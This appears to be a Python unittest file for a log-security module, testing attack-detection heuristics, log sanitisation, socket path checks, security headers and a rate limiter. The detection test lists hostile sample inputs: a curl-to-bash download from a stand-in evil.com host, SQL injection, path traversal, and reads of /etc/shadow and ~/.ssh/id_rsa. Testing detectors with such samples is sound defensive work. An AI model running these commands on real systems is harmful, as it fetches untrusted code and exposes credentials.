"""Tests for pkg.security module."""

import os
import stat
import tempfile
import unittest
from pathlib import Path

from pkg.security.security import (
    SECURITY_HEADERS,
    TokenBucketLimiter,
    analyze_log_heuristics,
    calculate_entropy,
    detect_attack_types,
    is_high_entropy,
    is_suspicious_heuristic,
    sanitize_log_line,
    secure_socket_permissions,
    strip_ansi,
    validate_socket_path,
    verify_security_headers,
)


class TestSecurityModule(unittest.TestCase):
    def test_calculate_entropy_empty(self):
        self.assertEqual(calculate_entropy(""), 0.0)

    def test_calculate_entropy_values(self):
        # Repeated characters have low entropy
        low_entropy = calculate_entropy("aaaaaaaaaaaaaaaa")
        self.assertEqual(low_entropy, 0.0)

        # High entropy string (pseudo-random base64 payload)
        high_entropy_str = "4A8k9LmZ2xQp7WvB1cNy6RtE3uIo8SgF0jKl5MhD"
        high_entropy = calculate_entropy(high_entropy_str)
        self.assertGreater(high_entropy, 4.5)
        self.assertTrue(is_high_entropy(high_entropy_str, threshold=4.5))

    def test_is_suspicious_heuristic_benign(self):
        benign_logs = [
            "Oct 18 12:00:01 server CRON[1234]: (root) CMD (/usr/bin/backup.sh)",
            "Accepted publickey for user1 from 192.168.1.50 port 54321 ssh2",
            "systemd[1]: Started Daily apt upgrade and clean activities.",
            "GET /index.html HTTP/1.1 200 OK",
        ]
        for log in benign_logs:
            self.assertFalse(
                is_suspicious_heuristic(log),
                f"Log incorrectly marked suspicious: {log}",
            )

    def test_is_suspicious_heuristic_attacks(self):
        attacks = [
            ("SELECT * FROM users WHERE id=1 UNION SELECT username, password FROM admin", "SQL Injection"),
            ("GET /page.php?id=1' OR 1=1 --", "SQL Injection"),
            ("GET /../../../../etc/passwd HTTP/1.1", "Directory Traversal"),
            ("curl -s http://evil.com/malware.sh | bash", "Command Injection"),
            ("cat /etc/shadow", "Directory Traversal"),
            ("php -r 'eval(base64_decode(\"abc\"));'", "Code Injection"),
            ("<script>alert('xss')</script>", "Cross-Site Scripting (XSS)"),
            ("cat ~/.ssh/id_rsa", "Credential Access"),
        ]
        for log, expected_cat in attacks:
            self.assertTrue(
                is_suspicious_heuristic(log),
                f"Attack missed: {log}",
            )
            detected = detect_attack_types(log)
            self.assertIn(expected_cat, detected)

    def test_analyze_log_heuristics(self):
        attack = "GET /login?user=admin' OR 1=1 --"
        result = analyze_log_heuristics(attack)
        self.assertTrue(result.is_suspicious)
        self.assertGreaterEqual(result.confidence_score, 0.60)
        self.assertEqual(result.attack_type, "SQL Injection")
        self.assertIn("SQL Injection", result.explanation)

        benign = "User logged out successfully"
        benign_result = analyze_log_heuristics(benign)
        self.assertFalse(benign_result.is_suspicious)
        self.assertEqual(benign_result.confidence_score, 0.0)

    def test_sanitize_log_line(self):
        # CRLF injection
        crlf_log = "Login failed\r\nCRITICAL: Admin rights granted to attacker\n"
        sanitized = sanitize_log_line(crlf_log)
        self.assertNotIn("\r", sanitized)
        self.assertNotIn("\n", sanitized)
        self.assertIn("Login failed", sanitized)

        # ANSI escape codes
        ansi_log = "\x1b[31;1mRed Alert\x1b[0m normal text"
        clean_ansi = strip_ansi(ansi_log)
        self.assertEqual(clean_ansi, "Red Alert normal text")
        self.assertEqual(sanitize_log_line(ansi_log), "Red Alert normal text")

        # Null bytes
        null_log = "test\x00payload"
        self.assertEqual(sanitize_log_line(null_log), "testpayload")

        # Length limit
        long_log = "A" * 10000
        truncated = sanitize_log_line(long_log, max_length=50)
        self.assertEqual(len(truncated), 50)

    def test_validate_socket_path(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            safe_socket = os.path.join(tmpdir, "test.sock")
            validated = validate_socket_path(safe_socket, allowed_dirs=[tmpdir])
            self.assertEqual(validated, str(Path(safe_socket).resolve()))

            # Disallowed directory should raise ValueError
            with self.assertRaises(ValueError):
                validate_socket_path(
                    "/unauthorized_root/test.sock", allowed_dirs=[tmpdir]
                )

        # Empty path
        with self.assertRaises(ValueError):
            validate_socket_path("")

    def test_secure_socket_permissions(self):
        with tempfile.NamedTemporaryFile() as tmp:
            self.assertTrue(secure_socket_permissions(tmp.name, mode=0o600))
            current_mode = stat.S_IMODE(os.stat(tmp.name).st_mode)
            self.assertEqual(current_mode, 0o600)

    def test_verify_security_headers(self):
        matching = {
            "Content-Type": "application/json; charset=utf-8",
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": "DENY",
            "Content-Security-Policy": "default-src 'none'",
            "X-XSS-Protection": "1; mode=block",
        }
        valid, missing = verify_security_headers(matching)
        self.assertTrue(valid)
        self.assertEqual(len(missing), 0)

        incomplete = {"Content-Type": "text/html"}
        valid, missing = verify_security_headers(incomplete)
        self.assertFalse(valid)
        self.assertGreater(len(missing), 0)

    def test_token_bucket_limiter(self):
        limiter = TokenBucketLimiter(rate=10.0, capacity=2.0)
        self.assertTrue(limiter.allow(1.0))
        self.assertTrue(limiter.allow(1.0))
        # Exceeded capacity
        self.assertFalse(limiter.allow(1.0))


if __name__ == "__main__":
    unittest.main()
